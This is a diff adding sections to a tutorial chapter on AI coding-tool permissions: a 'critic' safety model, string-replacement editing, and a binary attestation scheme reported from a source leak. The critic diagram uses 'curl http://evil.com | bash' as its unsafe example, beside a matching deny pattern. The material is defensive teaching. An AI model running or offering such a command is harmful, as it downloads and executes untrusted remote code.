@@ -12,7 +12,7 @@
 
 # Chapter 30: Tool Execution & Permissions
 
-> Part 6: Anatomy of AI Developer Tools · Phase 2 · Prerequisites: Ch 8, Ch 11, Ch 27 · Advanced · TypeScript + Architecture
+> **Part 6 — Anatomy of AI Developer Tools** | Phase 2: Become an Expert | Prerequisites: Ch 8, Ch 11, Ch 27 | Difficulty: Advanced | Language: TypeScript + Architecture
 
 When a model calls a tool, it is expressing an intention: "I want to read this file" or "I want to run this command." The harness must decide whether to fulfill that intention, and how. This decision -- what the agent can do, what it cannot, and what requires human approval -- is the most consequential design choice in any AI developer tool. Get it right and the agent is a trusted collaborator. Get it wrong and it is either dangerously autonomous or uselessly constrained.
 
@@ -579,6 +579,54 @@ Even in skip mode, the deny list still applies. This is the last line of defense
 }
 ```
 
+### 4.4 ML-Based Safety Inference: The Critic Pattern
+
+The three permission modes above rely on static rules: allow lists, deny lists, and risk tiers. But static rules cannot anticipate every dangerous command. The open-source reimplementation claw-code-agent and analysis of Claude Code's original source (where `query.ts` alone is 785KB) reveal a fourth mechanism: **ML-based safety inference**.
+
+Instead of maintaining an ever-growing allowlist of safe commands, the harness can send the proposed action to the model as a separate side-query:
+
+```
+┌──────────────────────────────────────────────────────────┐
+│           THE CRITIC PATTERN                              │
+│                                                           │
+│  Agent proposes: Bash("curl http://evil.com | bash")      │
+│                      │                                    │
+│                      ▼                                    │
+│  ┌────────────────────────────────────────┐               │
+│  │  CRITIC QUERY (separate model call)    │               │
+│  │                                        │               │
+│  │  System: "You are a safety evaluator.  │               │
+│  │  Evaluate whether this command is safe  │               │
+│  │  to execute in a development context.   │               │
+│  │  Consider: data loss, system damage,    │               │
+│  │  security risks, network exfiltration." │               │
+│  │                                        │               │
+│  │  User: "Bash: curl http://evil.com     │               │
+│  │  | bash"                               │               │
+│  │                                        │               │
+│  │  Response: UNSAFE - pipes remote       │               │
+│  │  content directly to shell execution   │               │
+│  └────────────────────────────────────────┘               │
+│                      │                                    │
+│              UNSAFE  │  SAFE                              │
+│                 ▼         ▼                               │
+│            BLOCK     AUTO-APPROVE                         │
+│            or ASK    (within mode rules)                  │
+└──────────────────────────────────────────────────────────┘
+```
+
+This is fundamentally different from static matching. A glob pattern like `Bash(curl * | bash)` catches one specific phrasing. The critic catches the intent: any command that pipes untrusted remote content into an interpreter, regardless of phrasing.
+
+The original Claude Code source reveals three permission modes at a higher level that align with this pattern:
+
+- **Default mode:** Ask for everything that is not explicitly allowed. The critic is not needed because the human is already in the loop.
+- **Bypass mode:** Skip all prompts. The critic becomes the safety net -- it evaluates commands the human is not reviewing.
+- **Strict mode:** Never auto-approve anything, even if the critic says safe. Belt and suspenders.
+
+**The cost trade-off.** The critic pattern adds one model call per tool execution. For a small, fast model (Haiku-class), this adds roughly 200ms and fractions of a cent per tool call. For high-risk operations in bypass mode, this cost is trivially justified. For low-risk read operations, it is unnecessary overhead -- which is why the critic is typically gated behind the risk tier system. Low-risk tools skip the critic. High-risk tools in auto/bypass mode invoke it.
+
+**Lesson for your own agents:** If you are building a permission system for an agent that runs in automation (CI, scheduled tasks, headless mode), the critic pattern is how you get safety without a human. Ship a small, fast model as the safety evaluator. It costs almost nothing and catches the commands that no static allowlist can anticipate.
+
 ---
 
 ## 5. How Cursor Handles Tool Execution Differently
@@ -952,6 +1000,92 @@ Not every tool call needs adversarial verification. Use it for:
 │  BENEFIT: Catches errors before they affect code   │
 └──────────────────────────────────────────────────┘
 ```
+
+### 8.3 String Replacement Editing: Why Exact Match Beats Full Rewrite
+
+Claude Code's file editing tool uses **exact string matching and replacement**, not full file rewrites. When the model wants to change a file, it specifies an `old_string` (the exact text currently in the file) and a `new_string` (the replacement). If the old_string does not exist verbatim in the file -- wrong whitespace, wrong indentation, stale content from a previous turn -- the edit fails.
+
+```
+┌──────────────────────────────────────────────────────────┐
+│           STRING REPLACEMENT vs FULL REWRITE              │
+│                                                           │
+│  FULL REWRITE (what naive agents do):                     │
+│  ├── Model generates the entire file content              │
+│  ├── Writes it all at once                                │
+│  ├── Risk: clobbers unrelated content                     │
+│  ├── Risk: introduces drift from the actual file          │
+│  ├── Diff is huge and hard to review                      │
+│  └── Token cost: proportional to entire file size         │
+│                                                           │
+│  STRING REPLACEMENT (what Claude Code does):              │
+│  ├── Model specifies exact old_string to find             │
+│  ├── Model specifies new_string to replace it with        │
+│  ├── Edit fails if old_string is not found (safety net)   │
+│  ├── Diff is small and easy to review                     │
+│  ├── Unrelated content is never touched                   │
+│  └── Token cost: proportional to the change, not the file │
+└──────────────────────────────────────────────────────────┘
+```
+
+**Why edits fail.** The most common failure mode is that the model tries to edit a string it remembers from earlier in the conversation, but the file has changed since then (another edit was applied, or the user changed it manually). The exact string no longer exists. This is why the harness enforces a "read the file first, then edit" pattern -- reading refreshes the model's knowledge of the file's actual content right before the edit.
+
+```
+Common failure sequence:
+  1. Model reads file at Turn 3 (sees line 42: "  const x = 5;")
+  2. Several turns pass, file gets modified
+  3. At Turn 12, model tries to edit "  const x = 5;"
+  4. File now has "  const x = 10;" at that line
+  5. Edit fails: old_string not found
+  
+Reliable sequence:
+  1. Model reads file immediately before editing
+  2. Model uses the EXACT string it just read
+  3. Edit succeeds
+```
+
+**The practical implication:** Smaller, targeted edits succeed more often than large replacements. An edit that replaces 3 lines has one potential point of failure (those 3 lines). An edit that replaces 50 lines has many more points where the old_string might diverge from the file's actual content. This is why Claude Code's system prompt instructs the model to prefer the Edit tool over the Write tool for modifications, and to keep edits focused.
+
+This design choice also keeps diffs clean. When an agent uses string replacement, each change is a minimal, reviewable patch. When it rewrites entire files, the diff shows every line as changed even if most of the content is identical. For human-in-the-loop workflows (Ch 11), reviewable diffs are essential for trust.
+
+### 8.4 DRM Below the JavaScript Layer
+
+Claude Code includes a binary attestation mechanism that operates below the JavaScript runtime -- a form of DRM that proves API requests originated from a genuine Claude Code binary.
+
+The mechanism works like this: API requests from Claude Code contain placeholder values (such as `cch=ed1b0`) in certain fields. These placeholders are not populated by the JavaScript application code. Instead, Bun's native HTTP stack -- written in Zig -- intercepts the outgoing request and overwrites the placeholders with cryptographically computed hashes derived from the binary itself.
+
+```
+┌──────────────────────────────────────────────────────────┐
+│           BINARY ATTESTATION FLOW                         │
+│                                                           │
+│  JavaScript layer:                                        │
+│  ├── Builds API request                                   │
+│  ├── Inserts placeholder: cch=ed1b0                       │
+│  └── Hands request to Bun's HTTP stack                    │
+│                                                           │
+│  Zig layer (compiled, not inspectable):                   │
+│  ├── Intercepts outgoing request                          │
+│  ├── Computes hash from binary + request data             │
+│  ├── Overwrites placeholder with computed hash            │
+│  └── Sends request to Anthropic API                       │
+│                                                           │
+│  API server:                                              │
+│  ├── Receives request with computed hash                  │
+│  ├── Validates hash against known binary signatures       │
+│  └── Rejects requests with invalid/missing attestation    │
+│                                                           │
+│  WHY ZIG?                                                 │
+│  ├── JavaScript can be monkey-patched at runtime          │
+│  ├── Node/Bun JS modules can be intercepted or replaced   │
+│  ├── Compiled Zig cannot be inspected or overridden       │
+│  └── Attestation lives below the scriptable layer         │
+└──────────────────────────────────────────────────────────┘
+```
+
+**Why this exists.** Third-party tools that wrapped or replicated Claude Code's API calls -- including open-source alternatives like OpenCode -- reportedly faced unexplained API-level friction (rate limiting, access denials). The binary attestation mechanism explains why: those tools could not produce valid hashes because the Zig-level code was not available to them. Their requests were being identified (and potentially throttled or blocked) at the API level.
+
+**Important caveats:** This mechanism appears to be gated behind a compile-time flag, meaning it may not be active in all builds or all regions. It was discovered in the source leak, not officially documented by Anthropic. Whether it is currently enforced in production is not publicly confirmed.
+
+**Practical lesson for platform builders.** When you need to verify that requests originate from your official client (not a wrapper, proxy, or counterfeit), push the attestation below the scriptable layer. JavaScript-level checks can be bypassed by anyone who can modify the runtime. Compiled native code (Zig, Rust, C) raises the bar significantly. This is the same principle behind mobile app attestation (SafetyNet/Play Integrity on Android, App Attest on iOS) -- the verification must happen at a level the application code cannot tamper with.
 
 ---
 
